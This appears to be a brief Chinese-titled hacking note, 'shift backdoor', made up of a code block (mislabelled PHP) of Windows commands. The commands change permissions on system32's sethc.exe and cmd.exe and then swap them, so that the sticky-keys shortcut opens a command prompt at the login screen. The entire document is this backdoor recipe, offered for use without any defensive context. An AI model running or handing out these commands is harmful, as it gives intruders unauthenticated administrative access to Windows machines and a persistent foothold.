## shift后门
```PHP
CD C:\windows\system32
cacls sethc.exe /t /e /G Administrators:f
cacls cmd.exe /t /e /G Administrators:f
ren sethc.exe aaa.exe
ren cmd.exe sethc.exe
```